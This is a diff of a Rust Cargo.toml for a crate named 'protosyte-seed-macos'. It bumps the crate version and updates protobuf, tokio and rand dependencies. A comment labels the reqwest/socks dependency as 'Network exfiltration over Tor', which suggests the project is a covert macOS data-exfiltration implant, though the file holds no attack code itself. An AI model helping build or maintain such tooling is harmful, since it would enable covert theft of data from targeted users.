@@ -1,6 +1,6 @@
 [package]
 name = "protosyte-seed-macos"
-version = "0.1.0"
+version = "3.0.0"
 edition = "2021"
 
 [lib]
@@ -9,12 +9,12 @@ crate-type = ["cdylib", "rlib"]
 
 [dependencies]
 # Protobuf serialization/deserialization
-prost = { version = "0.13", features = ["derive"] }
-prost-types = "0.13"
+prost = { version = "0.14", features = ["derive"] }
+prost-types = "0.14"
 
 # Network exfiltration over Tor
 reqwest = { version = "0.12", features = ["rustls-tls", "socks", "multipart"] }
-tokio = { version = "1.40", features = ["full"] }
+tokio = { version = "1.48", features = ["full"] }
 
 # In-memory data processing
 aes-gcm = "0.10"
@@ -29,11 +29,11 @@ objc = "0.2"
 sha2 = "0.10"
 hmac = "0.12"
 hex = "0.4"
-rand = "0.8"
+rand = "0.9"
 regex = "1.10"
 
 [build-dependencies]
-prost-build = "0.13"
+prost-build = "0.14"
 
 [features]
 default = []
